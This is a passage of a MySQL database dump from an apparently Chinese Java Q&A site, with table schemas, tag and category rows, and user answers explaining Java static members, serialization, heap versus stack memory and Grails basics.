INSERT INTO `article_category` VALUES (1,4,1),(2,67,5),(3,68,1),(4,69,5),(5,70,5),(7,29,5),(8,30,5),(9,31,5),(10,32,5),(11,33,5),(12,34,5),(13,35,5),(14,36,5),(15,37,5),(16,38,5),(17,39,5),(18,40,5),(19,41,5),(20,42,5),(21,43,5),(22,44,5),(23,45,5),(24,46,5),(25,47,5),(26,48,5),(27,49,5),(28,50,5),(29,51,5),(30,53,7),(31,54,7),(32,55,7),(33,56,7),(34,57,7),(35,52,2),(36,58,2),(37,59,2),(38,60,2),(39,61,2),(40,62,2),(41,63,3),(42,64,3),(43,65,3),(44,66,6),(45,1,1),(46,2,1),(47,3,1),(48,5,1),(49,6,1),(50,7,1),(51,8,1),(52,9,1),(53,10,1),(54,11,1),(55,12,1),(56,13,1),(57,14,1),(58,15,1),(59,16,1),(60,17,4),(61,18,4),(62,19,4),(63,20,4),(64,21,4),(65,22,4),(66,23,4),(67,24,4),(68,25,4),(69,26,4),(70,27,4),(71,28,4),(72,71,2),(73,71,3),(74,72,1),(75,73,7),(76,74,7),(77,75,1);
/*!40000 ALTER TABLE `article_category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `article_rate`
--

DROP TABLE IF EXISTS `article_rate`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `article_rate` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `article_id` bigint(20) NOT NULL,
  `create_date` varchar(255) NOT NULL,
  `is_support` bit(1) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_kdh0lnl0o3xuiw9p68bm54l29` (`article_id`) USING BTREE,
  KEY `FK_5gear7obv0looxwdo4kk1pxx2` (`user_id`) USING BTREE,
  KEY `FKE87EE289E792E6AC` (`article_id`),
  KEY `FKE87EE2898C5B8E5` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `article_rate`
--

LOCK TABLES `article_rate` WRITE;
/*!40000 ALTER TABLE `article_rate` DISABLE KEYS */;
/*!40000 ALTER TABLE `article_rate` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `article_tag`
--

DROP TABLE IF EXISTS `article_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `article_tag` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `create_date` varchar(255) NOT NULL,
  `article_id` bigint(20) NOT NULL,
  `tag_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK30CA50D1E792E6AC` (`article_id`),
  KEY `FK30CA50D1BD49DC94` (`tag_id`)
) ENGINE=MyISAM AUTO_INCREMENT=154 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `article_tag`
--

LOCK TABLES `article_tag` WRITE;
/*!40000 ALTER TABLE `article_tag` DISABLE KEYS */;
INSERT INTO `article_tag` VALUES (1,'20150604142903',1,10),(2,'20150604142904',1,12),(3,'20150604171602',2,51),(4,'20150604171639',3,52),(138,'20150729190723',4,11),(137,'20150729190723',4,54),(7,'20150605195311',5,11),(8,'20150605195311',5,55),(9,'20150605195311',5,34),(10,'20150605195311',5,56),(11,'20150605195311',5,57),(12,'20150605195416',6,11),(13,'20150605195416',6,3),(14,'20150605195416',6,58),(15,'20150605200801',7,3),(16,'20150605200801',7,11),(17,'20150605200801',7,34),(18,'20150608080647',8,59),(19,'20150608080647',8,60),(20,'20150608080927',9,61),(21,'20150608081325',10,62),(22,'20150608081927',11,63),(23,'20150608081927',11,64),(24,'20150608082332',12,65),(25,'20150608082735',13,66),(26,'20150608082735',13,67),(27,'20150608083125',14,59),(28,'20150608083125',14,68),(29,'20150608083722',15,69),(30,'20150608083722',15,70),(31,'20150608084400',16,3),(32,'20150608084400',16,71),(33,'20150608084400',16,72),(34,'20150613213118',17,73),(35,'20150613213118',17,74),(36,'20150613213118',17,75),(37,'20150613215133',18,73),(38,'20150613215133',18,76),(39,'20150613215133',18,74),(40,'20150613215133',18,77),(41,'20150613215133',18,75),(42,'20150613215332',19,74),(43,'20150613215332',19,73),(44,'20150613215332',19,78),(45,'20150613215614',20,73),(46,'20150613215614',20,79),(47,'20150613220055',21,73),(48,'20150613220055',21,80),(49,'20150613220055',21,81),(50,'20150613220610',22,82),(51,'20150613220652',23,73),(52,'20150613220652',23,83),(53,'20150613220907',24,73),(54,'20150613220907',24,78),(55,'20150613220907',24,84),(56,'20150613220907',24,85),(57,'20150613221143',25,73),(58,'20150613221143',25,86),(59,'20150613221245',26,73),(60,'20150613221245',26,87),(61,'20150613221245',26,88),(62,'20150613221522',27,73),(63,'20150613221522',27,89),(64,'20150613221735',28,73),(65,'20150613221735',28,90),(66,'20150617085051',29,59),(67,'20150617085051',29,91),(68,'20150617090334',30,59),(69,'20150617090334',30,54),(70,'20150617090334',30,75),(71,'20150617090525',31,92),(72,'20150617090525',31,93),(73,'20150617090525',31,94),(74,'20150617090525',31,95),(75,'20150617091034',32,92),(76,'20150617091034',32,96),(77,'20150617091034',32,97),(78,'20150617091209',33,92),(79,'20150617091209',33,98),(80,'20150617091310',34,92),(81,'20150617091310',34,99),(82,'20150617091658',35,75),(83,'20150617091658',35,100),(84,'20150617091948',36,101),(85,'20150617092404',37,102),(86,'20150617092547',38,92),(87,'20150617092547',38,103),(88,'20150617092640',39,104),(89,'20150617092930',40,105),(90,'20150617093322',41,106),(91,'20150617093716',42,92),(92,'20150617093716',42,107),(93,'20150617094509',43,108),(94,'20150617094833',44,109),(95,'20150617095032',45,110),(96,'20150617095218',46,111),(97,'20150617095218',46,112),(98,'20150617095218',46,113),(99,'20150617095346',47,114),(100,'20150617095507',48,115),(101,'20150617095628',49,116),(102,'20150617095813',50,92),(103,'20150617095813',50,117),(104,'20150617095930',51,118),(105,'20150618172821',52,119),(106,'20150618172821',52,120),(107,'20150618172821',52,121),(108,'20150619085706',53,122),(109,'20150619085706',53,75),(110,'20150619085919',54,122),(111,'20150619085919',54,123),(112,'20150619090028',55,124),(113,'20150619090227',56,125),(114,'20150619100548',57,126),(115,'20150712130746',58,135),(116,'20150712130746',58,136),(117,'20150712131601',59,41),(118,'20150712131601',59,137),(119,'20150712132637',60,138),(120,'20150712132637',60,41),(121,'20150712132637',60,139),(122,'20150712133816',61,138),(123,'20150712133816',61,140),(124,'20150712134728',62,138),(125,'20150712134728',62,140),(126,'20150712134728',62,141),(127,'20150713080237',63,142),(128,'20150713080237',63,147),(129,'20150713080401',64,142),(130,'20150713080401',64,147),(131,'20150713080401',64,148),(132,'20150713080525',65,142),(133,'20150713080525',65,148),(134,'20150713080525',65,149),(135,'20150715212438',66,150),(136,'20150715212438',66,151),(139,'20150823091640',67,113),(140,'20150823091744',68,44),(141,'20150823093301',69,113),(142,'20150823093301',69,59),(143,'20150823093635',70,59),(144,'20150823093635',70,113),(145,'20150908005847',72,152),(146,'20150909043244',73,122),(147,'20150909043244',73,153),(148,'20150909043446',74,122),(149,'20150909043446',74,154),(150,'20150909043446',74,155),(152,'20150921004932',75,156),(153,'20150921004933',75,157);
/*!40000 ALTER TABLE `article_tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ask`
--

DROP TABLE IF EXISTS `ask`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ask` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `content` longtext,
  `create_date` varchar(255) NOT NULL,
  `oppose_num` int(11) NOT NULL,
  `question_id` bigint(20) NOT NULL,
  `support_num` int(11) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_ltmtuyo8r4pjfl7ubckuf274g` (`question_id`) USING BTREE,
  KEY `FK_bbvy96peu3wmc6y3butawpg2x` (`user_id`) USING BTREE,
  KEY `FK17A79BED47E4A` (`question_id`),
  KEY `FK17A798C5B8E5` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=55 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ask`
--

LOCK TABLES `ask` WRITE;
/*!40000 ALTER TABLE `ask` DISABLE KEYS */;
INSERT INTO `ask` VALUES (1,'<pre>\r\n<code class=\"language-java\">	/**\r\n	 * Return the names of all beans which depend on the specified bean, if any.\r\n	 * @param beanName the name of the bean\r\n	 * @return the array of dependent bean names, or an empty array if none\r\n	 */\r\n	public String[] getDependentBeans(String beanName) {\r\n		Set&lt;String&gt; dependentBeans = this.dependentBeanMap.get(beanName);\r\n		if (dependentBeans == null) {\r\n			return new String[0];\r\n		}\r\n		return StringUtils.toStringArray(dependentBeans);\r\n	}\r\n</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150417191823',0,1,0,1),(2,'<p>&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">function delFile(index) {\r\n    var rows = $(\'#fileTable\').datagrid(\"getRows\");\r\n    var id = rows[index].id;\r\n    $.messager.confirm(\'操作提示\', \'您确定要删除吗?\', function (data) {\r\n        if (data) {\r\n            $.post(baseUrl + \"fileManage/delFiles\", {idList: id.toString()}, function (result) {\r\n                if (result.success) {\r\n                    $.messager.alert(\'提示信息\', result.msg, \'info\');\r\n                    $(\'#fileTable\').datagrid(\"reload\");\r\n                } else {\r\n                    $.messager.alert(\'错误提示\', result.msg, \'error\');\r\n                }\r\n            });\r\n        }\r\n    });\r\n}</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150418175231',0,12,0,4),(3,'<pre>\r\n需要了解2个概念：内部类和静态修饰符static\r\n1）首先，用内部类是因为内部类与所在外部类有一定的关系，往往只有该外部类调用此内部类。所以没有必要专门用一个Java文件存放这个类。\r\n2）静态都是用来修饰类的内部成员的。比如静态方法，静态成员变量，静态常量。它唯一的作用就是随着类的加载（而不是随着对象的产生）而产生，以致可以用类名+静态成员名直接获得。\r\n这样静态内部类就可以理解了，因为这个类没有必要单独存放一个文件，它一般来说只被所在外部类使用。并且它可以直接被用 外部类名+内部类名 获得。\r\n\r\n以下举例说明怎么使用：\r\nStudent类有个叫School的内部类（非静态）\r\nStudent stu = new Student();\r\nstu.School sch = new stu.School();\r\nsch就是School的一个对象。\r\n\r\n假如School是内部静态类：\r\nStudent.School sch = new Student.School();</pre>\r\n','20150418180235',0,12,0,2),(4,'<pre>\r\nGrails是一套用于快速Web应用开发的开源框架，它基于Groovy编程语言，并构建于Spring、Hibernate和其它标准Java框架之上，从而为大家带来一套能实现超高生产力的一站式框架。\r\n　　Ruby on Rails开创了将一门强大的编程语言和一个坚持己见、提倡用通情达理的默认设置代替复杂配置的框架进行创造性结合的先河。然而，还有许多组织并没有做好从Java的安全保护伞下走出的准备，也没有打算放弃他们目前在Java上的投入。而Grails的出现，使得在一个以Java为中心的环境中实现同等生产力的想法成为可能。\r\n　　 \r\nGrails的插件系统\r\n\r\n　　grails的插件系统也是其亮点之一。首先，和rails，django等web框架类似，基于微内核的思想，插件（可重用模块）是框架的一等公民。grails除了核心模块以外的功能几乎都是通过插件方式实现的。实际上，一个grails插件和一个grails应用基本是完全一样的，同样可以使用grails run-app命令来运行。区别仅在于一个插件的根目录下需要提供一个fooplugin.groovy文件，提供插件的一些描述信息。\r\n　　grails插件基本可以做任何事情，grails社区已经提供了各式各样的插件，发布在grails官方插件源上。查看现有的官方插件，可以执行下面的命令：\r\n　　grails list-plugins\r\n　　安装插件可以执行以下命令：\r\n　　grails install-plugin 插件名或插件路径\r\n　　 \r\nHello World示例\r\n\r\n　　是时一个被用烂了而又经典的例子，在创建应用程序之前，先熟悉一下grails命令的使用（确保grails环境已配置好）。 \r\n　　grails command name\r\n　　现在我们为了创建一个Grails应用，需要输入的命令是create-app \r\n　　grails create-app helloworld\r\n　　这样就在当前目录下创建了一个名为helloworld（即我们的应用程序名）的文件夹，在这个文件夹中包含了我们这个项目的整个文件目录，可以使用如下命令进入这个目录中查看： \r\n　　cd helloworld\r\n　　为了完成这个经典的Hello World示例，我们需要运行create-controller命令，您先进入CMD命令行并执行：\r\n　　grails create-controller hello \r\n　　运行该命令后会在grails-app/controller目录下创建一个名为HelloController.groovy的控制器 控制器主要用来完成对Web请求的处理，我们稍微修改一下控制器的内容，使它能够在页面上输出Hello World!的字样，代码如下: \r\n　　class HelloController { def world = { render Hello World! }} 现在控制器已经完成了，接下来要使用run-app来启动内置的jetty服务器运行刚刚创建的helloworld程序 \r\n　　grails run-app运行后会在8080端口（默认，可以使用-Dserver.port来指定端口）启动服务器，然后在浏览器中输入http://localhost:8080/helloworld来启动应用程序.</pre>\r\n','20150418180317',0,11,0,2),(5,'<pre>\r\nInetAddress addr = InetAddress.getLocalHost();\r\nip=addr.getHostAddress().toString;//获得本机IP\r\naddress=addr.getHostName()toString;//获得本机名称</pre>\r\n','20150418180343',0,10,0,2),(6,'<pre>\r\nJava的堆是一个运行时数据区,类的(对象从中分配空间。这些对象通过new、newarray、anewarray和multianewarray等 指令建立，它们不需要程序代码来显式的释放。堆是由垃圾回收来负责的，堆的优势是可以动态地分配内存大小，生存期也不必事先告诉编译器，因为它是在运行时 动态分配内存的，Java的垃圾收集器会自动收走这些不再使用的数据。但缺点是，由于要在运行时动态分配内存，存取速度较慢。 \r\n\r\n栈的优势是，存取速度比堆要快，仅次于寄存器，栈数据可以共享。但缺点是，存在栈中的数据大小与生存期必须是确定的，缺乏灵活性。栈中主要存放一些基本类 型的变量（,int, short, long, byte, float, double, boolean, char）和对象句柄。 \r\n\r\n栈有一个很重要的特殊性，就是存在栈中的数据可以共享。假设我们同时定义： \r\nint a = 3; \r\nint b = 3； \r\n编译器先处理int a = 3；首先它会在栈中创建一个变量为a的引用，然后查找栈中是否有3这个值，如果没找到，就将3存放进来，然后将a指向3。接着处理int b = 3；在创建完b的引用变量后，因为在栈中已经有3这个值，便将b直接指向3。这样，就出现了a与b同时均指向3的情况。 \r\n\r\n这时，如果再令a=4；那么编译器会重新搜索栈中是否有4值，如果没有，则将4存放进来，并令a指向4；如果已经有了，则直接将a指向这个地址。因此a值的改变不会影响到b的值。 \r\n\r\n要注意这种数据的共享与两个对象的引用同时指向一个对象的这种共享是不同的，因为这种情况a的修改并不会影响到b, 它是由编译器完成的，它有利于节省空间。而一个对象引用变量修改了这个对象的内部状态，会影响到另一个对象引用变量。 \r\n\r\nString是一个特殊的包装类数据。可以用： \r\nString str = new String(&quot;abc&quot;); \r\nString str = &quot;abc&quot;; \r\n两种的形式来创建，第一种是用new()来新建对象的，它会在存放于堆中。每调用一次就会创建一个新的对象。 \r\n而第二种是先在栈中创建一个对String类的对象引用变量str，然后查找栈中有没有存放&quot;abc&quot;，如果没有，则将&quot;abc&quot;存放进栈，并令str指向&rdquo;abc&rdquo;，如果已经有&rdquo;abc&rdquo; 则直接令str指向&ldquo;abc&rdquo;。 \r\n\r\n比较类里面的数值是否相等时，用equals()方法；当测试两个包装类的引用是否指向同一个对象时，用==，下面用例子说明上面的理论。 \r\nString str1 = &quot;abc&quot;; \r\nString str2 = &quot;abc&quot;; \r\nSystem.out.println(str1==str2); //true \r\n可以看出str1和str2是指向同一个对象的。 \r\n\r\nString str1 =new String (&quot;abc&quot;); \r\nString str2 =new String (&quot;abc&quot;); \r\nSystem.out.println(str1==str2); // false \r\n用new的方式是生成不同的对象。每一次生成一个。 \r\n\r\n因此用第一种方式创建多个&rdquo;abc&rdquo;字符串,在内存中其实只存在一个对象而已. 这种写法有利与节省内存空间. 同时它可以在一定程度上提高程序的运行速度，因为JVM会自动根据栈中数据的实际情况来决定是否有必要创建新对象。而对于String str = new String(&quot;abc&quot;)；的代码，则一概在堆中创建新对象，而不管其字符串值是否相等，是否有必要创建新对象，从而加重了程序的负担。 \r\n\r\n另一方面, 要注意: 我们在使用诸如String str = &quot;abc&quot;；的格式定义类时，总是想当然地认为，创建了String类的对象str。担心陷阱！对象可能并没有被创建！而可能只是指向一个先前已经创建的 对象。只有通过new()方法才能保证每次都创建一个新的对象。 \r\n由于String类的immutable性质，当String变量需要经常变换其值时，应该考虑使用StringBuffer类，以提高程序效率。</pre>\r\n','20150418180429',0,8,0,2),(7,'<p>值传递：(形式参数类型是基本数据类型)：方法调用时，实际参数把它的值传递给对应的形式参数，形式参数只是用实际参数的值初始化自己的存储单元内容，是两个不同的存储单元，所以方法执行中形式参数值的改变不影响实际参数的值。</p>\r\n\r\n<p>引用传递：(形式参数类型是引用数据类型参数)：也称为传地址。方法调用时，实际参数是对象(或数组)，这时实际参数与形式参数指向同一个地址，在方法执行中，对形式参数的操作实际上就是对实际参数的操作，这个结果在方法结束后被保留了下来，所以方法执行中形式参数的改变将会影响实际参数。</p>\r\n\r\n<p>&nbsp;</p>\r\n','20150418212324',0,9,0,2),(8,'<pre>\r\n一、基础类 \r\n1、《Thinking in java》，入门第一位是建立正确的概念。\r\n2、《Core Java》，我没系统读过，这本书更贴近实践，更多API的介绍，同样，更新也更频繁。\r\n \r\n二、进阶类\r\n1、《Effective Java》，在熟悉语法、API之后，你需要知道最佳实践和陷阱，没有比这本更好的。\r\n2、《Java Puzzlers》，通过谜题介绍一些你可能没有注意到的边角料，作为趣味读物也不错\r\n3、《深入Java虚拟机》，翻译一般，但不可不读，最好结合最新的JVM规范来读。\r\n \r\n三、特定领域\r\n1、网络编程：\r\n（1） O&rsquo;Reilly的《Java nio》，很多人都推荐，我个人觉的一般，基本上只是个API更详细的说明文档,O&rsquo;reilly的java系列很多都是这样。\r\n（2）推荐这本《Fundamental networking in java》，由浅入深教你怎么做java网络编程，并且介绍很多背景知识，甚至介绍了各种最佳实践、网络编程模型以及Java socket在不同平台之间的差异等等。\r\n \r\n2、并发编程：\r\n（1）《Java Concurrency in Practic》，并发领域必读经典。\r\n（2）《Java并发编程：设计原则与模式》，同样是Doug lea的作品。\r\n（3) 《java threads》，入门读物。\r\n \r\n3、、模式与设计\r\n1、《设计模式》，GOF的经典。\r\n2、《设计模式精解》，应该有最新版，个人认为更适合入门。\r\n3、《Head first设计模式》，更轻松的入门读物。\r\n4、《企业应用架构模式》\r\n5、《分析模式&mdash;&mdash;可复用对象模型》\r\n6、《面向模式的软件体系结构》，国内貌似翻译了3卷，绝对经典，可惜翻译较差。\r\n7、《重构&mdash;&mdash;改善既有代码设计》,想写好代码必读。\r\n8、《重构与模式》\r\n \r\n4、方法论\r\n1、《敏捷软件开发》\r\n2、《测试驱动开发》，你不一定要TDD，但是你一定要学会做单元测试。\r\n3、《Agile Java》，也可以作为java入门读物。\r\n4、《快速软件开发》\r\n5、《面向对象分析与设计》，OO设计必读。\r\n6、《Unix编程艺术》，打开你的眼界。\r\n \r\n5、Java之外\r\n1、《unix网络编程》，学习网络编程必读书。\r\n2、《C++网络编程》上下两卷，介绍ACE的，但是其中对各种模式运用的介绍非常值的一读。\r\n3、《Joel说软件》，编程文化\r\n4、《人月神话》、《人件》\r\n5、《卓有成效的程序员》，给我很大启发的一本书。\r\n6、《程序员修炼之道》\r\n7、《计算机程序的构造与解释》，必读\r\n8、《算法导论》，可以作为参考书\r\n9、《深入理解计算机系统》\r\n10、《编译原理》龙书，最新版用java解释。</pre>\r\n','20150418212420',0,7,0,2),(9,'<pre>\r\n有要详解,那我找资料给你吧\r\n\r\nstatic表示&ldquo;全局&rdquo;或者&ldquo;静态&rdquo;的意思，用来修饰成员变量和成员方法，也可以形成静态static代码块，但是Java语言中没有全局变量的概念。 \r\n\r\n被static修饰的成员变量和成员方法独立于该类的任何对象。也就是说，它不依赖类特定的实例，被类的所有实例共享。\r\n\r\n只要这个类被加载，Java虚拟机就能根据类名在运行时数据区的方法区内定找到他们。因此，static对象可以在它的任何对象创建之前访问，无需引用任何对象。 \r\n\r\n用public修饰的static成员变量和成员方法本质是全局变量和全局方法，当声明它类的对象市，不生成static变量的副本，而是类的所有实例共享同一个static变量。 \r\n\r\nstatic变量前可以有private修饰，表示这个变量可以在类的静态代码块中，或者类的其他静态成员方法中使用（当然也可以在非静态成员方法中使用--废话），但是不能在其他类中通过类名来直接引用，这一点很重要。实际上你需要搞明白，private是访问权限限定，static表示不要实例化就可以使用，这样就容易理解多了。static前面加上其它访问权限关键字的效果也以此类推。 \r\n\r\nstatic修饰的成员变量和成员方法习惯上称为静态变量和静态方法，可以直接通过类名来访问，访问语法为： \r\n类名.静态方法名(参数列表...) \r\n类名.静态变量名 \r\n\r\n用static修饰的代码块表示静态代码块，当Java虚拟机（JVM）加载类时，就会执行该代码块（用处非常大，呵呵）。 \r\n\r\n1、static变量 \r\n　按照是否静态的对类成员变量进行分类可分两种：一种是被static修饰的变量，叫静态变量或类变量；另一种是没有被static修饰的变量，叫实例变量。\r\n\r\n两者的区别是： \r\n　对于静态变量在内存中只有一个拷贝（节省内存），JVM只为静态分配一次内存，在加载类的过程中完成静态变量的内存分配，可用类名直接访问（方便），当然也可以通过对象来访问（但是这是不推荐的）。 \r\n　对于实例变量，没创建一个实例，就会为实例变量分配一次内存，实例变量可以在内存中有多个拷贝，互不影响（灵活）。 \r\n\r\n所以一般在需要实现以下两个功能时使用静态变量：\r\n  在对象之间共享值时\r\n  方便访问变量时\r\n\r\n2、静态方法 \r\n静态方法可以直接通过类名调用，任何的实例也都可以调用，\r\n因此静态方法中不能用this和super关键字，不能直接访问所属类的实例变量和实例方法(就是不带static的成员变量和成员成员方法)，只能访问所属类的静态成员变量和成员方法。\r\n因为实例成员与特定的对象关联！这个需要去理解，想明白其中的道理，不是记忆！！！ \r\n因为static方法独立于任何实例，因此static方法必须被实现，而不能是抽象的abstract。\r\n\r\n例如为了方便方法的调用，Java API中的Math类中所有的方法都是静态的，而一般类内部的static方法也是方便其它类对该方法的调用。\r\n\r\n静态方法是类内部的一类特殊方法，只有在需要时才将对应的方法声明成静态的，一个类内部的方法一般都是非静态的 \r\n\r\n3、static代码块 \r\n\r\n　static代码块也叫静态代码块，是在类中独立于类成员的static语句块，可以有多个，位置可以随便放，它不在任何的方法体内，JVM加载类时会执行这些静态的代码块，如果static代码块有多个，JVM将按照它们在类中出现的先后顺序依次执行它们，每个代码块只会被执行一次。例如： \r\n\r\n\r\n</pre>\r\n\r\n<pre>\r\n<code class=\"language-java\">public class Test5 { \r\nprivate static int a; \r\nprivate int b; \r\n\r\nstatic{ \r\nTest5.a=3; \r\nSystem.out.println(a); \r\nTest5 t=new Test5(); \r\nt.f(); \r\nt.b=1000; \r\nSystem.out.println(t.b); \r\n} \r\nstatic{ \r\nTest5.a=4; \r\nSystem.out.println(a); \r\n} \r\npublic static void main(String[] args) { \r\n// TODO 自动生成方法存根 \r\n} \r\nstatic{ \r\nTest5.a=5; \r\nSystem.out.println(a); \r\n} \r\npublic void f(){ \r\nSystem.out.println(\"hhahhahah\"); \r\n} \r\n}  \r\n</code></pre>\r\n\r\n<pre>\r\n\r\n运行结果： \r\n3 \r\nhhahhahah \r\n1000 \r\n4 \r\n5 \r\n\r\n　利用静态代码块可以对一些static变量进行赋值，最后再看一眼这些例子，都一个static的main方法，这样JVM在运行main方法的时候可以直接调用而不用创建实例。 \r\n\r\n4、static和final一块用表示什么 \r\nstatic final用来修饰成员变量和成员方法，可简单理解为&ldquo;全局常量&rdquo;！ \r\n对于变量，表示一旦给值就不可修改，并且通过类名可以访问。 \r\n对于方法，表示不可覆盖，并且可以通过类名直接访问。\r\n\r\n有时你希望定义一个类成员，使它的使用完全独立于该类的任何对象。通常情况下，类成员必须通过它的类的对象访问，但是可以创建这样一个成员，它能够被它自己使用，而不必引用特定的实例。在成员的声明前面加上关键字static(静态的)就能创建这样的成员。如果一个成员被声明为static，它就能够在它的类的任何对象创建之前被访问，而不必引用任何对象。你可以将方法和变量都声明为static。static 成员的最常见的例子是main( ) 。因为在程序开始执行时必须调用main() ，所以它被声明为static。 \r\n\r\n声明为static的变量实质上就是全局变量。当声明一个对象时，并不产生static变量的拷贝，而是该类所有的实例变量共用同一个static变量。声明为static的方法有以下几条限制： \r\n&bull; \r\n它们仅能调用其他的static 方法。 \r\n&bull; \r\n它们只能访问static数据。 \r\n&bull; \r\n它们不能以任何方式引用this 或super（关键字super 与继承有关，在下一章中描述）。 \r\n如果你需要通过计算来初始化你的static变量，你可以声明一个static块，Static 块仅在该类被加载时执行一次。下面的例子显示的类有一个static方法，一些static变量，以及一个static 初始化块： \r\n// Demonstrate static variables，methods，and blocks. \r\n\r\n\r\n</pre>\r\n\r\n<pre>\r\n<code class=\"language-java\">class UseStatic { \r\n    static int a = 3; \r\n    static int b; \r\n\r\n    static void meth(int x) { \r\n        System.out.println(\"x = \" + x); \r\n        System.out.println(\"a = \" + a); \r\n        System.out.println(\"b = \" + b); \r\n    } \r\n\r\n    static { \r\n        System.out.println(\"Static block initialized.\"); \r\n        b = a * 4; \r\n    } \r\n\r\n    public static void main(String args[]) { \r\n       meth(42); \r\n    } \r\n} </code></pre>\r\n\r\n<pre>\r\n\r\n\r\n一旦UseStatic 类被装载，所有的static语句被运行。首先，a被设置为3，接着static 块执行(打印一条消息)，最后，b被初始化为a*4 或12。然后调用main()，main() 调用meth() ，把值42传递给x。3个println ( ) 语句引用两个static变量a和b，以及局部变量x 。 \r\n\r\n注意：在一个static 方法中引用任何实例变量都是非法的。 \r\n\r\n下面是该程序的输出： \r\n\r\nStatic block initialized. \r\nx = 42 \r\na = 3 \r\nb = 12 \r\n在定义它们的类的外面，static 方法和变量能独立于任何对象而被使用。这样，你只要在类的名字后面加点号运算符即可。例如，如果你希望从类外面调用一个static方法，你可以使用下面通用的格式： \r\n\r\nclassname.method( ) \r\n\r\n这里，classname 是类的名字，在该类中定义static方法。可以看到，这种格式与通过对象引用变量调用非static方法的格式类似。一个static变量可以以同样的格式来访问&mdash;&mdash;类名加点号运算符。这就是Java 如何实现全局功能和全局变量的一个控制版本。 \r\n\r\n下面是一个例子。在main() 中，static方法callme() 和static 变量b在它们的类之外被访问。 \r\n\r\n\r\n</pre>\r\n\r\n<pre>\r\n<code class=\"language-java\">class StaticDemo { \r\nstatic int a = 42; \r\nstatic int b = 99; \r\nstatic void callme() { \r\n    System.out.println(\"a = \" + a); \r\n  } \r\n} \r\n\r\nclass StaticByName { \r\n\r\npublic static void main(String args[]) { \r\nStaticDemo.callme(); \r\nSystem.out.println(\"b = \" + StaticDemo.b); \r\n} \r\n} \r\n</code></pre>\r\n\r\n<pre>\r\n\r\n下面是该程序的输出： \r\n\r\na = 42 \r\nb = 99 \r\n\r\nstatic成员是不能被其所在class创建的实例访问的。 \r\n\r\n如果不加static修饰的成员是对象成员，也就是归每个对象所有的。 \r\n\r\n加static修饰的成员是类成员，就是可以由一个类直接调用，为所有对象共有的</pre>\r\n','20150418212706',0,6,0,2),(10,'<pre>\r\n1、序列化是干什么的？\r\n\r\n  简单说就是为了保存在内存中的各种对象的状态，并且可以把保存的对象状态再读出来。虽然你可以用你自己的各种各样的方法来保存Object States，但是Java给你提供一种应该比你自己好的保存对象状态的机制,那就是序列化。\r\n\r\n2、什么情况下需要序列化 \r\n\r\na）当你想把的内存中的对象保存到一个文件中或者数据库中时候；\r\nb）当你想用套接字在网络上传送对象的时候；\r\nc）当你想通过RMI传输对象的时候；\r\n\r\n3、当对一个对象实现序列化时，究竟发生了什么？\r\n\r\n在没有序列化前，每个保存在堆（Heap）中的对象都有相应的状态（state），即实例变量（instance ariable）比如：\r\n\r\nFoo myFoo = new Foo(); \r\nmyFoo .setWidth(37); \r\nmyFoo.setHeight(70); \r\n\r\n  当通过下面的代码序列化之后，MyFoo对象中的width和Height实例变量的值（37，70）都被保存到foo.ser文件中，这样以后又可以把它 从文件中读出来，重新在堆中创建原来的对象。当然保存时候不仅仅是保存对象的实例变量的值，JVM还要保存一些小量信息，比如类的类型等以便恢复原来的对 象。\r\n\r\nFileOutputStream fs = new FileOutputStream(&quot;foo.ser&quot;); \r\nObjectOutputStream os = new ObjectOutputStream(fs); \r\nos.writeObject(myFoo); \r\n\r\n4、实现序列化（保存到一个文件）的步骤\r\n\r\na）Make a FileOutputStream \r\njava 代码\r\nFileOutputStream fs = new FileOutputStream(&quot;foo.ser&quot;); \r\nb）Make a ObjectOutputStream \r\n\r\njava 代码\r\nObjectOutputStream os = new ObjectOutputStream(fs); \r\nc）write the object\r\n\r\njava 代码\r\nos.writeObject(myObject1); \r\nos.writeObject(myObject2); \r\nos.writeObject(myObject3); \r\nd) close the ObjectOutputStream\r\n\r\njava 代码\r\nos.close(); \r\n\r\n5、举例说明\r\n\r\njava 代码\r\n\r\n</pre>\r\n\r\n<pre>\r\n<code class=\"language-java\">import java.io.*; \r\n\r\npublic class Box implements Serializable \r\n{ \r\nprivate int width; \r\nprivate int height; \r\n\r\npublic void setWidth(int width){ \r\nthis.width = width; \r\n} \r\npublic void setHeight(int height){ \r\nthis.height = height; \r\n} \r\n\r\npublic static void main(String[] args){ \r\nBox myBox = new Box(); \r\nmyBox.setWidth(50); \r\nmyBox.setHeight(30); \r\n\r\ntry{ \r\nFileOutputStream fs = new FileOutputStream(\"foo.ser\"); \r\nObjectOutputStream os = new ObjectOutputStream(fs); \r\nos.writeObject(myBox); \r\nos.close(); \r\n}catch(Exception ex){ \r\nex.printStackTrace(); \r\n} \r\n} \r\n\r\n} </code></pre>\r\n\r\n<pre>\r\n\r\n\r\n6、相关注意事项\r\n\r\na）当一个父类实现序列化，子类自动实现序列化，不需要显式实现Serializable接口；\r\nb）当一个对象的实例变量引用其他对象，序列化该对象时也把引用对象进行序列化；\r\nc）并非所有的对象都可以序列化，,至于为什么不可以，有很多原因了,比如：\r\n\r\n  